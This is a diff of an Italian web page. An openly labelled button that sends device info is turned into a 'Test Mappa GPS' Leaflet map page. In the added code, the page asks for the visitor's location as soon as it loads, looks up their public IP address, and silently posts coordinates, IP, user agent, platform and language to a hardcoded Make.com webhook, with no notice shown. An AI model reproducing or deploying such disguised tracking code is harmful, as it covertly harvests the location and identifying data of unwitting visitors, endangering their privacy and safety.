@@ -1,63 +1,91 @@
-<!DOCTYPE html>
+l<!DOCTYPE html>
 <html lang="it">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Invia info dispositivo</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Test Mappa GPS</title>
+  <link rel="icon" href="favicon.png" />
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #f5f5f7;
+    }
+    #map {
+      height: 100vh;
+      width: 100vw;
+      z-index: 0;
+      filter: contrast(1.05) brightness(1.05);
+    }
+    #logo {
+      position: fixed;
+      top: 12px;
+      left: 16px;
+      width: 56px;
+      height: 56px;
+      background: rgba(255,255,255,0.7);
+      backdrop-filter: blur(8px);
+      border-radius: 50%;
+      padding: 8px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    #logo img {
+      max-width: 100%;
+      pointer-events: none;
+    }
+  </style>
 </head>
 <body>
-  <h1>Invia info dispositivo</h1>
-  <button id="sendBtn">📍 Invia posizione e info</button>
-  <div id="status"></div>
+  <div id="logo" onclick="location.href='index.html'">
+    <img src="favicon.png" alt="Logo Miniutti.it">
+  </div>
+  <div id="map"></div>
 
-<script>
-const WEBHOOK_URL = "https://hook.eu1.make.com/iu8aa7aatmrxy67k2l0mc9dvud48471u";
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script>
+    const webhook = "https://hook.eu1.make.com/iu8aa7aatmrxy67k2l0mc9dvud48471u";
 
-const btn = document.getElementById("sendBtn");
-const status = document.getElementById("status");
+    navigator.geolocation.getCurrentPosition(pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const timestamp = new Date().toISOString();
 
-btn.addEventListener("click", () => {
-  if (!navigator.geolocation) {
-    status.textContent = "Geolocalizzazione non supportata.";
-    return;
-  }
-  status.textContent = "Calcolo posizione e info…";
+      const map = L.map('map').setView([lat, lon], 13);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '',
+        maxZoom: 19
+      }).addTo(map);
 
-  navigator.geolocation.getCurrentPosition((pos) => {
-    let data = {
-      latitude: pos.coords.latitude,
-      longitude: pos.coords.longitude,
-      timestamp: new Date().toISOString(),
-      user: "Tobia",
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-    };
+      const marker = L.marker([lat, lon]).addTo(map);
 
-    fetch('https://api64.ipify.org?format=json')
-      .then(res => res.json())
-      .then(ipData => {
-        data.ip = ipData.ip;
-
-        fetch(WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data),
-        })
-        .then(res => {
-          if (res.ok) status.textContent = `✓ Inviato con IP: ${data.ip}`;
-          else status.textContent = "Errore invio.";
-        })
-        .catch(() => status.textContent = "Errore rete invio.");
-      })
-      .catch(() => {
-        status.textContent = "Errore nel recupero IP.";
-      });
-
-  }, (err) => {
-    status.textContent = "Errore geolocalizzazione: " + err.message;
-  });
-});
-</script>
+      fetch('https://api64.ipify.org?format=json')
+        .then(res => res.json())
+        .then(ipData => {
+          const payload = {
+            latitude: lat,
+            longitude: lon,
+            timestamp: timestamp,
+            ip: ipData.ip,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language
+          };
+          fetch(webhook, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+          });
+        });
+    }, err => {
+      alert("Errore nel recupero della posizione.");
+    });
+  </script>
 </body>
 </html>
